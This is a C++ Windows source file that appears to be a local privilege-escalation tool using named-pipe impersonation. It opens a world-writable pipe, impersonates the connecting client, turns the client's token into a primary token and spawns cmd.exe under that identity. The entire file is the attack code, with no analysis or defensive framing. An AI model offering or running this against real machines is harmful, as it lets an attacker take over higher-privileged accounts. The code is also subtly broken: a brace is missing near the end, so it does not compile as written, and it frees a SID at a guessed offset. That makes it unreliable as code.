#include <windows.h>
#include <iostream>
#include <string>
#include <userenv.h>

#ifdef _MSC_VER
#pragma comment(lib, "userenv.lib")
#endif
// Helper function to log token privileges
void LogTokenPrivileges(HANDLE token) {
    DWORD size = 0;
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
    PTOKEN_PRIVILEGES privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, size);
    if (privileges && GetTokenInformation(token, TokenPrivileges, privileges, size, &size)) {
        std::wcout << L"Token Privileges:" << std::endl;
        for (DWORD i = 0; i < privileges->PrivilegeCount; i++) {
            WCHAR name[256];
            DWORD nameLen = 256;
            LookupPrivilegeNameW(NULL, &privileges->Privileges[i].Luid, name, &nameLen);
            std::wcout << L" - " << name << L" (Enabled: " << (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED ? L"Yes" : L"No") << L")" << std::endl;
        }
    }
    if (privileges) LocalFree(privileges);
}

// Helper function to create security attributes for "Everyone"
SECURITY_ATTRIBUTES CreateSecurityAttributes() {
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = FALSE;

    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (!pSD || !InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION)) {
        std::wcerr << L"Security descriptor initialization failed" << std::endl;
        return sa;
    }

    PSID pEveryoneSID = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID)) {
        std::wcerr << L"AllocateAndInitializeSid failed" << std::endl;
        LocalFree(pSD);
        return sa;
    }

    DWORD daclSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(pEveryoneSID) - sizeof(DWORD);
    PACL pDACL = (PACL)LocalAlloc(LPTR, daclSize);
    if (!pDACL || !InitializeAcl(pDACL, daclSize, ACL_REVISION)) {
        std::wcerr << L"DACL initialization failed" << std::endl;
        FreeSid(pEveryoneSID);
        LocalFree(pSD);
        return sa;
    }

    if (!AddAccessAllowedAce(pDACL, ACL_REVISION, FILE_GENERIC_READ | FILE_GENERIC_WRITE, pEveryoneSID)) {
        std::wcerr << L"AddAccessAllowedAce failed" << std::endl;
        LocalFree(pDACL);
        FreeSid(pEveryoneSID);
        LocalFree(pSD);
        return sa;
    }

    if (!SetSecurityDescriptorDacl(pSD, TRUE, pDACL, FALSE)) {
        std::wcerr << L"SetSecurityDescriptorDacl failed" << std::endl;
        LocalFree(pDACL);
        FreeSid(pEveryoneSID);
        LocalFree(pSD);
        return sa;
    }

    sa.lpSecurityDescriptor = pSD;
    return sa;
}

// Helper function to free security attributes
void FreeSecurityAttributes(SECURITY_ATTRIBUTES& sa) {
    if (sa.lpSecurityDescriptor) {
        PSECURITY_DESCRIPTOR pSD = sa.lpSecurityDescriptor;
        PACL pDACL = NULL;
        BOOL daclPresent = FALSE, daclDefaulted = FALSE;
        if (GetSecurityDescriptorDacl(pSD, &daclPresent, &pDACL, &daclDefaulted) && daclPresent && pDACL) {
            LocalFree(pDACL);
        }
        FreeSid((PSID)((BYTE*)pSD + sizeof(SECURITY_DESCRIPTOR)));
        LocalFree(pSD);
    }
}

int wmain() {
    LPCWSTR pipeName = L"\\\\.\\pipe\\mypipe";
    HANDLE serverPipe;
    wchar_t message[] = L"HELL";
    DWORD messageLength = lstrlenW(message) * sizeof(wchar_t);
    DWORD bytesWritten = 0;

    // Create security attributes for "Everyone"
    SECURITY_ATTRIBUTES sa = CreateSecurityAttributes();
    if (!sa.lpSecurityDescriptor) {
        std::wcerr << L"Failed to create security attributes" << std::endl;
        return 1;
    }

    std::wcout << L"Creating named pipe " << pipeName << std::endl;
    serverPipe = CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX | WRITE_DAC,
        PIPE_TYPE_MESSAGE | PIPE_WAIT,
        1,
        2048,
        2048,
        0,
        &sa
    );

    if (serverPipe == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateNamedPipe failed (" << GetLastError() << L")" << std::endl;
        FreeSecurityAttributes(sa);
        return 1;
    }

    std::wcout << L"Waiting for client connection..." << std::endl;
    if (!ConnectNamedPipe(serverPipe, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_PIPE_CONNECTED) {
            std::wcerr << L"ConnectNamedPipe failed (" << err << L")" << std::endl;
            CloseHandle(serverPipe);
            FreeSecurityAttributes(sa);
            return 1;
        }
    }

    std::wcout << L"Client connected" << std::endl;
    std::wcout << L"Sending message: " << message << std::endl;
    
    if (!WriteFile(serverPipe, message, messageLength, &bytesWritten, NULL)) {
        std::wcerr << L"WriteFile failed (" << GetLastError() << L")" << std::endl;
    }

    std::wcout << L"Impersonating client..." << std::endl;
    if (!ImpersonateNamedPipeClient(serverPipe)) {
        DWORD err = GetLastError();
        std::wcerr << L"Impersonation failed (" << err << L")" << std::endl;
        CloseHandle(serverPipe);
        FreeSecurityAttributes(sa);
        return 1;
    }

    WCHAR username[256];
    DWORD usernameLen = 256;
    if (GetUserNameW(username, &usernameLen)) {
        std::wcout << L"Impersonated as user: " << username << std::endl;
    } else {
        std::wcerr << L"GetUserName failed (" << GetLastError() << L")" << std::endl;
    }

    HANDLE hImpersonationToken;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hImpersonationToken)) {
        std::wcerr << L"OpenThreadToken failed (" << GetLastError() << L")" << std::endl;
        RevertToSelf();
        CloseHandle(serverPipe);
        FreeSecurityAttributes(sa);
        return 1;
    }

    LogTokenPrivileges(hImpersonationToken);

    // Convert impersonation token to primary token
    HANDLE hPrimaryToken;
    if (!DuplicateTokenEx(hImpersonationToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
        std::wcerr << L"DuplicateTokenEx failed (" << GetLastError() << L")" << std::endl;
        CloseHandle(hImpersonationToken);
        RevertToSelf();
        CloseHandle(serverPipe);
        FreeSecurityAttributes(sa);
        return 1;
    }

    // Create user environment block
    LPVOID envBlock = NULL;
    if (!CreateEnvironmentBlock(&envBlock, hPrimaryToken, FALSE)) {
        std::wcerr << L"CreateEnvironmentBlock failed (" << GetLastError() << L")" << std::endl;
        CloseHandle(hPrimaryToken);
        CloseHandle(hImpersonationToken);
        RevertToSelf();
        CloseHandle(serverPipe);
        FreeSecurityAttributes(sa);
        return 1;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    // Try launching cmd.exe locally first to resolve 0xc0000142
    wchar_t command[] = L"C:\\Windows\\System32\\cmd.exe";

    // Disable file system redirection for 32-bit processes
    PVOID oldRedirection = NULL;
    if (Wow64DisableWow64FsRedirection(&oldRedirection)) {
        std::wcout << L"Disabled file system redirection" << std::endl;
    }

    // Attempt CreateProcessAsUserW with primary token
    if (!CreateProcessAsUserW(
        hPrimaryToken,
        NULL,
        command,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
        envBlock,
        NULL,
        &si,
        &pi)
    ) {
        DWORD err = GetLastError();
        std::wcerr << L"CreateProcessAsUser failed (" << err << L")" << std::endl;
        
        // Fallback to CreateProcessWithTokenW
        if (!CreateProcessWithTokenW(
            hImpersonationToken,
            LOGON_WITH_PROFILE,
            NULL,
            command,
            CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
            envBlock,
            NULL,
            &si,
            &pi)
        ) {
            std::wcerr << L"CreateProcessWithToken failed (" << GetLastError() << L")" << std::endl;
        } else {
            std::wcout << L"Process started successfully (PID: " << pi.dwProcessId << L")" << std::endl;
        }
    } else {
        std::wcout << L"Process started successfully (PID: " << pi.dwProcessId << L")" << std::endl;
    }

    if (oldRedirection) {
        Wow64RevertWow64FsRedirection(oldRedirection);
        std::wcout << L"Restored file system redirection" << std::endl;
    

    // Cleanup (process remains running due to CREATE_NEW_CONSOLE)
    if (envBlock) DestroyEnvironmentBlock(envBlock);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    CloseHandle(hPrimaryToken);
    CloseHandle(hImpersonationToken);
    RevertToSelf();
    DisconnectNamedPipe(serverPipe);
    CloseHandle(serverPipe);
    FreeSecurityAttributes(sa);

    return 0;
}